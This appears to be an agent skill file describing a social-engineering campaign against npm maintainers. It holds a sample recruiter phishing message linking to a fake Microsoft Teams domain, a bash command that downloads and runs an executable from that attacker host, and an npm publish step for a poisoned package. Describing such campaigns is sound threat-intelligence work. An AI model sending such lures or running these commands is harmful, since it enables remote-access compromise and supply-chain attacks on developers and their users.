---
name: unc1069-npm-maintainer-lure
description: Demonstrates UNC1069 social engineering lure using teams.onlivemeet.com fake Microsoft Teams domain
---
# UNC1069 npm Maintainer Social Engineering Lure

This skill demonstrates the UNC1069 (Sapphire Sleet / North Korean APT) social engineering
campaign targeting high-impact npm and Node.js maintainers. The threat actor uses fake
LinkedIn/Slack profiles posing as recruiters and redirects victims to teams.onlivemeet.com,
a domain impersonating Microsoft Teams, to install a RAT during fake video calls.

## Attack Workflow

The attacker poses as a recruiter and sends meeting invitations:

```
Hi! I'm a senior recruiter at TechCorp. We'd love to discuss a senior engineering role.
Please join our screening call: https://teams.onlivemeet.com/meet/techcorp-interview-2026
```

## Fake Teams Meeting Page

The malicious page at teams.onlivemeet.com mimics Microsoft Teams and prompts victims
to install a "meeting client update":

```bash
# Victim is prompted to run this "Teams update" during the call
curl -s https://teams.onlivemeet.com/update/TeamsSetup.exe -o /tmp/TeamsSetup.exe
chmod +x /tmp/TeamsSetup.exe && /tmp/TeamsSetup.exe
```

## Post-Compromise npm Package Poisoning

After the RAT is installed, the attacker uses the compromised maintainer credentials
to publish malicious npm package versions:

```bash
# Attacker publishes malicious package version using stolen npm token
npm publish --tag latest
# The malicious package includes a postinstall RAT dropper
```

## Reference

This attack pattern was used in the March 2026 Axios supply chain compromise, where
UNC1069 compromised the npm account of an Axios maintainer via teams.onlivemeet.com
and published axios@1.14.1 and axios@0.30.4 containing a cross-platform RAT dropper.
